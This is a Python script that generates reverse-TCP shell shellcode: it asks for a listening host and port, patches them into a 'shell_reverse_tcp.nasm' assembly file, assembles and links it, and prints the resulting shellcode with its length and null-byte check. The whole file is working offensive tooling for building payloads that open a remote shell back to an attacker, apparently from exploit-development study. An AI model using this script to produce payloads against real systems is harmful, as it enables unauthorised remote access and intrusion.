#!/usr/bin/python3

# Wrapper script for compiling and linking shell_reverse_tcp.nasm
# with a user-defined host / port number to listen on.

# William Moody
# 28.12.2021

import socket
import subprocess
import os
import re

# Get the LHOST and LPORT from user and calculate binary values

lhost = input("[*] Please enter desired LHOST: ")

ipv4_pattern = re.compile("^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
if not ipv4_pattern.match(lhost):
	print("[-] An IP address is required!")
	exit(1)

lhost_bin = ""
for b in socket.inet_aton(lhost)[::-1]:
	lhost_bin += "%.2x" % b
print("    -- inet_aton(%s) = 0x%s" % (lhost, lhost_bin))

lport = input("[*] Please enter desired LPORT: ")

if not lport.isdigit():
	print("[-] Numeric value required!")
	exit(1)

lport = int(lport)
if lport < 0 or lport > 65535:
	print("[-] Invalid number for port!")
	exit(1)

lport_htons = socket.htons(lport)
print("    -- htons(%d) = 0x%x" % (lport, lport_htons))
print()

# Replace LPORT and LHOST in the file

orig = open("shell_reverse_tcp.nasm", "r")
autogen = open("tmp.nasm", "w")

for line in orig:
	if "LPORT" in line:
		line = line.replace("LPORT", "0x%x" % lport_htons)
	elif "LHOST" in line:
		line = line.replace("LHOST", "0x%s" % lhost_bin)
	autogen.write(line)

orig.close()
autogen.close()

# Assemble and link the file

print("[*] Assembling...", end="")
if subprocess.call("nasm -f elf32 -o tmp.o tmp.nasm", shell=True) > 0:
	print("ERROR")
	exit(1)
print("OK")

print("[*] Linking...", end="")
if subprocess.call("ld -o shell_reverse_tcp tmp.o", shell=True) > 0:
	print("ERROR")
	exit(1)
print("OK")

# Delete temporary files

os.remove("tmp.nasm")
os.remove("tmp.o")

# Dump shellcode

print("[*] Dumping shellcode...", end="")
proc = subprocess.Popen("""objdump -d shell_reverse_tcp|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'""", shell=True, stdout=subprocess.PIPE)
shellcode = proc.stdout.read().rstrip().decode()
print("OK")

# Print some statistics about the shellcode

print("\n%s\n" % shellcode)
print("[*] Length: %d bytes" % (len(shellcode.replace("\\x","")) / 2))
print("[*] Contains NULL bytes?: %s" % ("YES" if "00" in shellcode else "NO"))
